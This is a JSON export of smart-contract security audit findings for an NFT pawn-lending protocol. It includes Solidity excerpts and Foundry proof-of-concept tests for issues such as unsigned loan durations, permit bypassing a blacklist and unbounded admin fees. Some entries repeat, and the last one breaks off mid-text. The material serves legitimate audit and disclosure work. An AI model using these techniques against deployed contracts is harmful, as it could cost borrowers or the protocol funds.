{
  "category": "NFT Lending",
  "total_findings": 542,
  "fetched_at": "2026-01-29T13:44:40Z",
  "findings": [
    {
      "id": "64690",
      "title": "[L-05] Unbounded Fee Parameters Allow Abusive Fees and Redemption DoS",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\n`PawnShop` charges a fee (in basis points) on top of the borrowed principal when a borrower redeems their NFT via `redeem(...)` (context).\n\nHowever, `setFees(...)` allows `MANAGER_ROLE` to set `fee7Days` and `fee30Days` to any `uint16` value, with no upper bound (e.g., `<= BASIS_POINTS`) and no sanity checks (problem).\n\nThis means a manager can set fees to values that make redemption economically impossible (or unexpectedly expensive), effectively trapping users or extracting arbitrary value at repayment time (impact).\n\n## Location of Affected Code\n\nFile: [Pawn.sol#L111-L115](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Pawn.sol#L111-L115)\n\n```solidity\nfunction setFees(uint16 _fee7Days, uint16 _fee30Days) external onlyRole(MANAGER_ROLE) {\n    // @audit No bounds checks (e.g., <= BASIS_POINTS)\n    fee7Days = _fee7Days;\n    fee30Days = _fee30Days;\n    emit FeesUpdated(_fee7Days, _fee30Days);\n}\n```\n\n## Impact\n\n- **Redemption DoS**: Fees can be set so high that borrowers cannot (or will not) repay.\n- **Unexpected user loss**: Borrowers who expected fixed or bounded fees can be forced into paying excessive fees to redeem collateral.\n\n## Proof of Concept\n\n1. User pawns an NFT.\n2. Manager calls `setFees(65_535, 65_535)`.\n3. `redeem(...)` now requires paying principal + ~655.35% fee, which will likely be infeasible for most borrowers.\n\n## Recommendation\n\nEnforce bounds (example):\n\n- `require(_fee7Days <= BASIS_POINTS && _fee30Days <= BASIS_POINTS)`\n\n## Team Response\n\nFixed.\n\n## [I-01] Burned UUIDs Can Be Re-Minted\n\n## Severity\n\nInformational Risk\n\n## Description\n\nThe `RWA.mint(...)` assigns a `uuid` to each token and enforces uniqueness by tracking `_usedUUIDs[uuid]` (context).\n\nHowever, all burn paths (`burn(...)`, `burnForRedemption(...)`, `burnForSellback(...)`) delete `_usedUUIDs[uuid]`, making the UUID available for reuse (problem).\n\nThis means the on-chain guarantee is “no two _currently existing_ tokens share a UUID”, not “a UUID is unique forever”. If off-chain systems treat `uuid` as a permanent physical-asset identifier, UUID reuse can lead to confusion or allow re-issuance of previously redeemed assets without an explicit re-deposit workflow (impact).\n\n## Location of Affected Code\n\nFile: [sRWA.sol#L140-L152](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol#L140-L152)\n\n```solidity\nfunction mint(address to, string calldata uuid) external onlyRole(MINTER_ROLE) nonReentrant whenNotPaused {\n    // code\n    if (_usedUUIDs[uuid]) revert UUIDAlreadyExists();\n    // code\n    _tokenUUID[tokenId] = uuid;\n    _usedUUIDs[uuid] = true;\n    _safeMint(to, tokenId);\n}\n```\n\nFile: [sRWA.sol#L200-L207](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol#L200-L207)\n\n```solidity\nfunction burnForRedemption(uint256 tokenId) external onlyTokenOwner(tokenId) whenNotPaused {\n    string memory uuid = _tokenUUID[tokenId];\n    // @audit UUID becomes reusable after burn\n    delete _usedUUIDs[uuid];\n    delete _tokenUUID[tokenId];\n    _burn(tokenId);\n}\n```\n\n## Impact\n\nUUID uniqueness is not permanent.\n\n## Proof of Concept\n\n1. Admin mints a token with `uuid = \"UUID-123\"`.\n2. Owner calls `burnForRedemption(tokenId)`.\n3. Admin mints a new token again with `uuid = \"UUID-123\"`; the mint succeeds because `_usedUUIDs[\"UUID-123\"]` was deleted.\n\n## Recommendation\n\nDecide which uniqueness guarantee is required:\n\n- If UUID must be globally unique forever, **do not delete** `_usedUUIDs[uuid]` on burn.\n\n## Team Response\n\nAcknowledged.\n\n## [I-02] Redundant `usedSignatures` Tracking Alongside Nonce-Based Replay Protection\n\n## Severity\n\nInformational Risk\n\n## Description\n\n`PawnShop` and `RWA` apply two replay protections to EIP-712 signatures:\n\n- Per-user `nonces[user]` included in the signed payload and incremented on success.\n- A global `usedSignatures[digest]` mapping.\n\nFor these flows, the nonce already prevents replay for the same sender: after a successful call, the contract computes the digest using `nonce + 1`, so the old signature no longer verifies. As a result, `usedSignatures` is largely redundant and adds an extra storage write.\n\nNote: `Treasury.transferWithSignature(...)` does not include a nonce, so `usedSignatures` (or adding a nonce/salt) is required there to prevent replay until `validUntil`.\n\n## Location of Affected Code\n\nFile: [Pawn.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Pawn.sol)\n\nFile: [sRWA.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol)\n\n- `usedSignatures[digest]` check + write in signature validation paths\n- `nonces[msg.sender]++` performed after successful validation\n\nFile: [Treasury.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Treasure.sol)\n\n- Signature payload lacks a nonce; `usedSignatures` provides replay protection until `validUntil`\n\n## Impact\n\nEach successful signature-based call in `PawnShop`/`RWA` incurs an extra `SSTORE` for `usedSignatures[digest]`.\n\n## Recommendation\n\nIn `PawnShop` and `RWA`, remove `usedSignatures` and rely on nonces for replay protection.\n\n## Team Response\n\nFixed.\n\n## [I-03] Configuration Mismatch Risk Across `backendSigner` and `treasury` Addresses\n\n## Severity\n\nInformational Risk\n\n## Description\n\nThe system relies on coordinated configuration across three separate contracts:\n\n- `PawnShop` validates a backend signature (`pawnSignature`) using its own `backendSigner`.\n- `RWA` validates a backend signature (`sellbackSignature`) using its own `backendSigner`.\n- `Treasury` validates a backend signature (`treasurySignature`) using _its_ `backendSigner`, and also requires the caller to be allowlisted.\n\nThese settings are each managed independently via admin setters (context).\n\nHowever, there is no on-chain enforcement that these configuration values remain consistent (problem).\n\nThis means a simple operational misconfiguration (e.g., updating `PawnShop.backendSigner` but not `Treasury.backendSigner`, or pointing `PawnShop.treasury` at the wrong address) can halt core flows like `pawn(...)` and `burnForSellback(...)` (impact).\n\n## Location of Affected Code\n\nFile: [Pawn.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Pawn.sol)\n\n```solidity\naddress public treasury;\naddress public backendSigner;\n\nfunction setTreasury(address _treasury) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    // code\n    treasury = _treasury;\n}\n\nfunction setBackendSigner(address _signer) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    // code\n    backendSigner = _signer;\n}\n```\n\nFile: [Treasure.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Treasure.sol)\n\n```solidity\naddress public backendSigner;\n\nfunction setBackendSigner(address _signer) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    // code\n    backendSigner = _signer;\n}\n```\n\nFile: [sRWA.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol)\n\n```solidity\naddress public treasury;\naddress public backendSigner;\n\nfunction setTreasury(address _treasury) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    // code\n    treasury = _treasury;\n}\n\nfunction setBackendSigner(address _signer) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    // code\n    backendSigner = _signer;\n}\n```\n\n## Impact\n\nMismatched signers or wrong treasury addresses cause signature checks or external calls to revert, halting user actions.\n\n## Proof of Concept\n\n1. Admin updates `PawnShop.backendSigner` to a new key.\n2. Admin forgets to update `Treasury.backendSigner`.\n3. Users can no longer successfully call `pawn(...)` because the pawn signature and treasury signature are validated against different signer keys across contracts.\n\n## Recommendation\n\nUse a **single configuration source of truth**, e.g. a registry contract that stores `backendSigner`/`treasury` addresses read by all modules.\n\n## Team Response\n\nAcknowledged.\n\n## [I-04] PawnShop `MAX_LOAN_AMOUNT` Can Exceed Treasury\n\n## Severity\n\nInformational Risk\n\n## Description\n\n`PawnShop` validates offers up to its hard cap `MAX_LOAN_AMOUNT = 1_000_000 * 10**6`, but the funding path `Treasury.transferWithSignature(...)` applies a per-call limit from `contractTransferLimits[msg.sender]` (defaulting to `maxTransferPerCall = 100_000 * 10**6` when unset).\n\nAs a result, `PawnShop` can accept and sign offers up to 1,000,000 USDC that will deterministically revert in Treasury for amounts above 100,000 USDC unless the transfer limit is explicitly raised.\n\n## Location of Affected Code\n\nFile: [Pawn.sol#L62](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Pawn.sol#L62)\n\n```solidity\n// max loan is 1 million usdc\nuint256 public constant MAX_LOAN_AMOUNT = 1_000_000 * 10**6;\n```\n\nFile: [Treasure.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Treasure.sol)\n\n```solidity\nmapping(address => uint256) public contractTransferLimits;\nuint256 public maxTransferPerCall = 100_000 * 10**6;\n\nfunction transferWithSignature(address recipient, uint256 amount, uint256 validUntil, bytes32 operationHash, bytes calldata signature) external nonReentrant whenNotPaused {\n    // code\n    uint256 limit = contractTransferLimits[msg.sender];\n    if (limit == type(uint256).max) limit = maxTransferPerCall;\n\n    if (amount > limit) revert AmountExceedsMaxTransfer();\n    if (amount > usdc.balanceOf(address(this))) revert InsufficientBalance();\n    // code\n}\n```\n\n## Impact\n\nUsers can waste gas on offers that pass `PawnShop` checks but fail funding.\n\n## Recommendation\n\nAlign the constraints:\n\n- Either lower `PawnShop.MAX_LOAN_AMOUNT` to match the effective Treasury limit, or\n- Raise/configure `Treasury.maxTransferPerCall` / `contractTransferLimits[PawnShop]` to support the intended max loan.\n\n## Team Response\n\nFixed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "64689",
      "title": "[L-04] Admin Can Drain Treasury Reserves via `withdrawUSDC()`",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nThe `Treasury` contract is the central pool of USDC that the system uses to fund `PawnShop.pawn(...)` loans and `RWA.burnForSellback(...)` buybacks (context).\n\nHowever, `Treasury.withdrawUSDC(...)` allows `DEFAULT_ADMIN_ROLE` to transfer arbitrary amounts of USDC to an arbitrary address, with no on-chain constraints.\n\nThis means an admin can fully drain user/protocol reserves and render core flows insolvent, effectively enabling a rug pull where the admin can steal all Treasury funds while users have NFTs locked in active pawn positions.\n\n## Location of Affected Code\n\nFile: [Treasure.sol#L167-L174](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Treasure.sol#L167-L174)\n\n```solidity\nfunction withdrawUSDC(address to, uint256 amount) external nonReentrant onlyRole(DEFAULT_ADMIN_ROLE) {\n    // @audit Admin can withdraw the entire USDC reserve at any time\n    if (to == address(0)) revert InvalidAddress();\n    if (amount == 0) revert InvalidAmount();\n    if (amount > usdc.balanceOf(address(this))) revert InsufficientBalance();\n\n    usdc.safeTransfer(to, amount);\n    emit USDCWithdrawn(to, amount);\n}\n```\n\n## Impact\n\nThe vulnerability enables direct fund loss as the admin can transfer all USDC out of the Treasury, leading to protocol insolvency where drained reserves cause signature-authorized payouts to fail due to insufficient balance, halting both `pawn(...)` and sellback flows. This effectively creates a rug pull scenario where the admin can drain all Treasury reserves while users have NFTs locked in active pawn positions, leaving users unable to access new loans and completely compromising the protocol's solvency.\n\n## Proof of Concept\n\n1. `Treasury` holds USDC reserves for loans and buybacks.\n2. Admin calls `withdrawUSDC(admin, usdc.balanceOf(address(treasury)))`.\n3. `Treasury` becomes empty; future payouts revert due to `InsufficientBalance()`.\n\n## Recommendation\n\nAllow a rescue token functionality with no USDC withdrawal or keep a track of the protocol's funds and only allow to sweep the dust.\n\n## Team Response\n\nFixed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "64688",
      "title": "[L-04] Unbounded Fee Parameters Allow Abusive Fees and Redemption DoS",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\n`PawnShop` charges a fee (in basis points) on top of the borrowed principal when a borrower redeems their NFT via `redeem(...)` (context).\n\nHowever, `setFees(...)` allows `MANAGER_ROLE` to set `fee7Days` and `fee30Days` to any `uint16` value, with no upper bound (e.g., `<= BASIS_POINTS`) and no sanity checks (problem).\n\nThis means a manager can set fees to values that make redemption economically impossible (or unexpectedly expensive), effectively trapping users or extracting arbitrary value at repayment time (impact).\n\n## Location of Affected Code\n\nFile: [Pawn.sol#L111-L115](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Pawn.sol#L111-L115)\n\n```solidity\nfunction setFees(uint16 _fee7Days, uint16 _fee30Days) external onlyRole(MANAGER_ROLE) {\n    // @audit No bounds checks (e.g., <= BASIS_POINTS)\n    fee7Days = _fee7Days;\n    fee30Days = _fee30Days;\n    emit FeesUpdated(_fee7Days, _fee30Days);\n}\n```\n\n## Impact\n\n- **Redemption DoS**: Fees can be set so high that borrowers cannot (or will not) repay.\n- **Unexpected user loss**: Borrowers who expected fixed or bounded fees can be forced into paying excessive fees to redeem collateral.\n\n## Proof of Concept\n\n1. User pawns an NFT.\n2. Manager calls `setFees(65_535, 65_535)`.\n3. `redeem(...)` now requires paying principal + ~655.35% fee, which will likely be infeasible for most borrowers.\n\n## Recommendation\n\nEnforce bounds (example):\n\n- `require(_fee7Days <= BASIS_POINTS && _fee30Days <= BASIS_POINTS)`\n\n## Team Response\n\nFixed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "64687",
      "title": "[L-03] `permit()` Can Approve a Blacklisted Spender (Missing Blacklist Check) But approve() Does Not Allow",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\n`RWA` enforces blacklist restrictions in `approve()` / `setApprovalForAll()` by reverting when the target operator/spender is blacklisted.\n\nHowever, the gasless approval path `permit()` does **not** validate `_isBlacklisted[spender]` and directly calls `_approve(spender, ...)`.\nAs a result, a blacklisted address can become the current `getApproved(tokenId)` via `permit()`, even though `approve()` would revert.\n\nNote: the blacklisted spender still cannot execute `transferFrom()` while blacklisted because `_update()` reverts when `auth` (caller) is blacklisted.\nSo this is primarily a **policy bypass / inconsistency** (and potential UX/integration/compliance confusion), not an immediate theft vector by itself.\n\n## Location of Affected Code\n\nFile: [Audit_Submission/src/sRWA.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Audit_Submission.zip)\n\n```solidity\nfunction permit(address spender, uint256 tokenId, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {\n  // code\n   _approve(spender, tokenId, owner); // missing: if (_isBlacklisted[spender]) revert Blacklisted();\n}\n\nfunction approve(address to, uint256 tokenId) public virtual override {\n   if (_isBlacklisted[to]) revert Blacklisted(); // blacklist enforced here\n   super.approve(to, tokenId);\n}\n```\n\n## Impact\n\nA blacklisted address can still appear as the approved spender for a token (`getApproved(tokenId)`), despite the blacklist policy.\n\n## Proof of Concept\n\nRun in `test/System.t.sol`\n\n```solidity\nfunction test_POC_Permit_Allows_BlacklistedSpender_ToBeApproved() public {\n    /**\n     * POC: `RWA.permit()` does NOT check `_isBlacklisted[spender]`, unlike `approve()`.\n     *\n     * Expected blacklist policy (as implemented in approve()):\n     * - You should NOT be able to approve a blacklisted spender.\n     *\n     * Actual behavior:\n     * - `approve(blacklisted, tokenId)` reverts,\n     * - but `permit(blacklisted, tokenId, ...)` succeeds and sets `getApproved(tokenId) == blacklisted`.\n     *\n     * Note: the blacklisted spender still cannot transfer (blocked by `_update()`'s `auth` blacklist check),\n     * so the impact is mainly \"policy bypass / inconsistent approval state\".\n     */\n    address blacklistedSpender = makeAddr(\"blacklistedSpender\");\n    address relayer = makeAddr(\"relayer\");\n    address receiver = makeAddr(\"receiver\");\n\n    // Mint a fresh token to `owner` (we have ownerPk so we can sign permits).\n    vm.startPrank(owner);\n    rwa.mint(owner, \"PERMIT-BLACKLIST\");\n    uint256 tokenId = rwa.nextTokenId() - 1;\n\n    // Admin blacklists the spender.\n    rwa.blacklistContract(blacklistedSpender);\n    assertTrue(rwa.isBlacklisted(blacklistedSpender));\n\n    // Baseline: normal approve() respects blacklist and reverts.\n    vm.expectRevert(RWA.Blacklisted.selector);\n    rwa.approve(blacklistedSpender, tokenId);\n    vm.stopPrank();\n\n    // Build an EIP-712 permit approving the blacklisted spender.\n    uint256 nonce = rwa.nonces(owner);\n    uint256 deadline = block.timestamp + 1 hours;\n    (uint8 v, bytes32 r, bytes32 s) = _signPermit(ownerPk, blacklistedSpender, tokenId, nonce, deadline);\n\n    // Anyone can submit the permit (gasless approval). Use a relayer for clarity.\n    vm.prank(relayer);\n    rwa.permit(blacklistedSpender, tokenId, deadline, v, r, s);\n\n    // Approval state is now set to a blacklisted address (policy bypass).\n    assertEq(rwa.getApproved(tokenId), blacklistedSpender);\n\n    // Even though approved, the blacklisted spender cannot transfer due to `_update()` reverting on `auth` blacklist.\n    vm.prank(blacklistedSpender);\n    vm.expectRevert(RWA.Blacklisted.selector);\n    rwa.transferFrom(owner, receiver, tokenId);\n}\n```\n\n## Recommendation\n\nConsider adding the same blacklist enforcement to `permit()` as `approve()`:\n\n- `if (spender != address(0) && _isBlacklisted[spender]) revert Blacklisted();`\n\n## Team Response\n\nFixed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "64686",
      "title": "[L-02] Hardcoded 6-decimal Stablecoin Assumptions Brick Protocol on 18-decimal Deployments",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\nNote: this issue is valid if the protocol deploys in chains like BSC\n\n1. In the BSC chain, a stable coin with $8B in circulation has 18 decimals: [address](https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955)\n2. Search other stablecoins, here at https://bscscan.com/tokens. They are mostly of 18 decimals\n\nMultiple core parameters are hardcoded as if the payment token (\"USDC\") always uses **6 decimals** (multiplying by `10**6`).\nIf the deployed payment token uses **18 decimals** (common for stables on some chains), these constants become off by 10^12,\ncausing critical functionality to revert or enforce meaningless limits.\n\nSpecifically:\n\n- `PawnShop.MAX_LOAN_AMOUNT` is expressed in 6-decimal units, so any realistic 18-decimal loan amount becomes “too high” and reverts.\n- `RWA.MIN_SELLBACK_AMOUNT` is intended to represent “1 USDC”, but on 18 decimals, it becomes dust, so the minimum sellback policy is not enforced.\n- `Treasury.maxTransferPerCall` defaults to a 6-decimal unit limit, so `transferWithSignature()` reverts for normal 18-decimal amounts until an admin updates the value.\n\n## Location of Affected Code\n\nFile: [Audit_Submission/src/Pawn.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Audit_Submission.zip)\n\n```solidity\nuint256 public constant MAX_LOAN_AMOUNT = 1_000_000 * 10**6;\n\nif (offerAmount == 0 || offerAmount > MAX_LOAN_AMOUNT) revert InvalidAmount();\n```\n\nFile: [Audit_Submission/src/sRWA.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Audit_Submission.zip)\n\n```solidity\nuint256 public constant MIN_SELLBACK_AMOUNT = 1 * 10**6;\n\nif (usdcAmount < MIN_SELLBACK_AMOUNT) revert InvalidAmount();\n```\n\nFile: [Audit_Submission/src/Treasury.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Audit_Submission.zip)\n\n```solidity\nuint256 public maxTransferPerCall = 100_000 * 10**6;\n\nif (limit == type(uint256).max) limit = maxTransferPerCall;\nif (amount > limit) revert AmountExceedsMaxTransfer();\n```\n\n## Impact\n\n- **Protocol bricking on 18-decimals deployments**: borrowers cannot take “normal” loans because `pawn()` reverts with `InvalidAmount()` for realistic values.\n- **Broken economic constraint**: `MIN_SELLBACK_AMOUNT` no longer enforces “minimum 1 token”; users can sell back for dust amounts if the backend signs it.\n- **Operational failure risk**: Treasury payouts revert with `AmountExceedsMaxTransfer()` until `maxTransferPerCall` is manually updated.\n\n## Proof of Concept\n\nRun it in `test/System.t.sol`\n\n```solidity\nfunction test_POC_18DecimalsStable_Hardcoded1e6_Assumptions_BrickOrBreakLimits() public {\n    /**\n     * This POC demonstrates a real deployment hazard:\n     * the protocol hardcodes several \"USDC has 6 decimals\" constants (x * 10**6),\n     * but many chains/tokens (e.g. BSC stables) use 18 decimals.\n     *\n     * In THIS test suite, `MockUSDC` inherits OpenZeppelin `ERC20`, which uses 18 decimals by default.\n     * So amounts like 1e18 represent \"1 whole token\", while 1e6 represents \"0.000000000001 token\".\n     *\n     * We prove all 3 issues in one flow:\n     *  (1) PawnShop.MAX_LOAN_AMOUNT is set to 1_000_000 * 1e6 (6-decimal units).\n     *      With an 18-decimal token, even a 1-token loan (1e18) is > MAX_LOAN_AMOUNT and reverts.\n     *  (2) RWA.MIN_SELLBACK_AMOUNT is set to 1 * 1e6, intended to mean \"1 USDC\".\n     *      With an 18-decimal token, this is dust (1e-12 token), so the \"min 1 token\" policy is not enforced.\n     *  (3) Treasury.maxTransferPerCall defaults to 100_000 * 1e6, also 6-decimals units.\n     *      With an 18-decimal token, even a 1-token payout exceeds the limit until the admin updates it.\n     */\n    assertEq(usdc.decimals(), 18);\n\n    // 1 whole token in base units for an 18-decimal ERC20.\n    uint256 oneToken = 1e18;\n\n    /* =============================================================\n     * (1) PawnShop MAX_LOAN_AMOUNT bricks normal loans on 18-decimals.\n     * ============================================================= */\n    {\n        uint256 tokenId = 1;\n\n        // MAX_LOAN_AMOUNT is 1_000_000 * 1e6 = 1e12 base units.\n        // On an 18-decimal token, 1e12 base units is only 0.000001 token.\n        assertEq(pawnShop.MAX_LOAN_AMOUNT(), 1_000_000 * 10**6);\n        assertGt(oneToken, pawnShop.MAX_LOAN_AMOUNT());\n\n        // Even with valid signatures, the call reverts before signature verification due to the hardcoded max amount.\n        PawnCall memory c = _buildPawnCall(user, tokenId, 7, oneToken, block.timestamp + 1 hours);\n\n        // Approve first (this should succeed). Then prove the pawn() itself is bricked by the hardcoded MAX_LOAN_AMOUNT.\n        vm.prank(user);\n        rwa.approve(address(pawnShop), tokenId);\n\n        vm.expectRevert(PawnShop.InvalidAmount.selector);\n        _pawnWithCall(user, c, false);\n\n        // Sanity: pawn reverted, so the NFT was not transferred.\n        assertEq(rwa.ownerOf(tokenId), user);\n    }\n\n    /* =============================================================\n     * (2) RWA MIN_SELLBACK_AMOUNT becomes dust on 18-decimal tokens.\n     * ============================================================= */\n    uint256 userBalBeforeSell = usdc.balanceOf(user);\n    {\n        uint256 tokenId = 1;\n        uint256 sellAmount = rwa.MIN_SELLBACK_AMOUNT(); // 1 * 1e6 base units\n        assertEq(sellAmount, 1 * 10**6);\n\n        // On 18 decimals, this is far less than 1 whole token, so the intended \"min 1 token\" policy is not enforced.\n        assertLt(sellAmount, oneToken);\n\n        uint256 validUntil = block.timestamp + 1 hours;\n        uint256 nonce = rwa.nonces(user);\n        bytes memory sellSig = _signSellback(backendPk, tokenId, sellAmount, validUntil, nonce);\n        bytes32 opHash = keccak256(abi.encode(\"SELLBACK\", tokenId, sellAmount, nonce, user));\n        bytes memory treasSig = _signTreasury(backendPk, user, sellAmount, validUntil, opHash);\n\n        // This succeeds because `sellAmount` >= MIN_SELLBACK_AMOUNT (even though it's dust in 18-decimal terms).\n        vm.prank(user);\n        rwa.burnForSellback(tokenId, sellAmount, validUntil, sellSig, treasSig);\n\n        assertEq(usdc.balanceOf(user), userBalBeforeSell + sellAmount);\n        vm.expectRevert();\n        rwa.ownerOf(tokenId); // tokenId 1 is burned\n    }\n\n    /* =============================================================\n     * (3) Treasury maxTransferPerCall is also 6-decimals by default.\n     * ============================================================= */\n    {\n        // Create a new approved contract so we can call `transferWithSignature` from an authorized sender.\n        TreasurySigReplayer replayer;\n        vm.startPrank(owner);\n        replayer = new TreasurySigReplayer(treasury);\n        treasury.approveContractForTransfers(address(replayer));\n        vm.stopPrank();\n\n        // Try a \"normal\" 1-token payout.\n        uint256 validUntil = block.timestamp + 1 hours;\n        bytes32 opHash = keccak256(\"POC_TREASURY_LIMIT_18_DECIMALS\");\n        bytes memory sig = _signTreasury(backendPk, user, oneToken, validUntil, opHash);\n\n        // This fails because Treasury defaults to maxTransferPerCall = 100_000 * 1e6 (6-decimals units).\n        // In 18-decimal terms, that limit is tiny, so even 1 token exceeds it.\n        assertEq(treasury.maxTransferPerCall(), 100_000 * 10**6);\n        assertGt(oneToken, treasury.maxTransferPerCall());\n\n        vm.expectRevert(Treasury.AmountExceedsMaxTransfer.selector);\n        replayer.replayTreasurySignature(user, oneToken, validUntil, opHash, sig);\n\n        // Admin can \"fix\" this after deployment by updating the limit to 18-decimal units,\n        // e.g. 100_000 tokens = 100_000 * 1e18.\n        vm.startPrank(owner);\n        treasury.setMaxTransferPerCall(100_000 * oneToken);\n        // Fund Treasury so the post-fix payout doesn't fail the balance check.\n        usdc.mint(address(treasury), oneToken);\n        vm.stopPrank();\n\n        uint256 userBalBeforePayout = usdc.balanceOf(user);\n        replayer.replayTreasurySignature(user, oneToken, validUntil, opHash, sig);\n        assertEq(usdc.balanceOf(user), userBalBeforePayout + oneToken);\n    }\n}\n```\n\n## Recommendation\n\n- Remove `10**6` hardcoding for the payment token.\n- Make thresholds **decimals-aware** by :\n  - **Passing `tokenDecimals` / `unit` as a constructor parameter**\n\n## Team Response\n\nFixed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "64685",
      "title": "[L-01] Pawn Duration Not Bound to Signed Quote Allows 7↔30-day Term Tampering",
      "impact": "LOW",
      "content": "\n## Severity\n\nLow Risk\n\n## Description\n\n`PawnShop` verifies an EIP-712 signature over `(tokenId, offerAmount, validUntil, nonce)` but `pawn()` accepts a user-supplied `durationDays` that is **not signed**.\nThis lets a borrower reuse the _same_ backend+treasury signatures while swapping duration terms:\n\n#### (Case 1): The backend intended a 7-day loan, but the borrower executed it as a 30-day loan.\n\nImpact (max severity scenario):\n\n- If your backend/risk engine prices or approves offers differently per duration (common),\n  a borrower can bypass that policy by choosing the more favourable term on-chain.\n\n#### (Case 2): The backend intended a 30-day loan, but the borrower executed it as a 7-day loan.\n\nImpact:\n\n- Direct protocol revenue loss: borrower pays the 7-day fee schedule instead of the 30-day fee schedule.\n- If your backend applies different approvals/limits per duration, this is also a term-tampering bypass.\n\n## Location of Affected Code\n\nFile: [Audit_Submission/src/Pawn.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Audit_Submission.zip)\n\n```solidity\n// durationDays is NOT part of the signed struct\nbytes32 private constant PAWN_TYPEHASH =\n    keccak256(\"Pawn(uint256 tokenId,uint256 offerAmount,uint256 validUntil,uint256 nonce)\");\n\nbytes32 structHash = keccak256(\n   abi.encode(\n       PAWN_TYPEHASH,\n       tokenId,\n       offerAmount,\n       validUntil,\n       usedNonce\n   )\n);\n\nfunction pawn(uint256 tokenId, uint8 durationDays, uint256 offerAmount, uint256 validUntil, bytes calldata, bytes calldata) external {\n    // durationDays controls fee + deadline, but is not authenticated by signatures\n    uint16 fee = durationDays == 7 ? fee7Days : fee30Days;\n    uint256 deadline = block.timestamp + (durationDays * 1 days);\n\n    // Treasury signature is also not bound to durationDays\n    bytes32 operationHash = keccak256(abi.encode(\"PAWN\", tokenId, offerAmount, currentNonce, msg.sender));\n}\n```\n\n## Impact\n\n- **7 → 30**: borrower can extend repayment window / delay liquidation from 7 to 30 days while using a quote intended for 7 days (bypasses duration-based risk approval; increases exposure + liquidity risk).\n- **30 → 7**: borrower can execute as 7 days to pay the lower fee schedule (protocol revenue loss + bypasses duration-based pricing).\n\n## Proof of Concept\n\nRun in `test/System.t.sol`\n\n```solidity\nfunction test_POC_Pawn_DurationNotSigned_AllowsExtending7DayQuoteTo30Days() public {\n    /**\n     * POC (Case 1): The backend intended a 7-day loan, but the borrower executed it as a 30-day loan.\n     *\n     * Root cause:\n     * - `PawnShop`'s EIP-712 signature (`PAWN_TYPEHASH`) does NOT commit to `durationDays` (or `deadline`).\n     * - The Treasury `operationHash` also does NOT commit to `durationDays`.\n     * Therefore, the exact same signatures are valid for BOTH `durationDays=7` and `durationDays=30`.\n     *\n     * Impact (max severity scenario):\n     * - If your backend/risk engine prices or approves offers differently per duration (common),\n     * 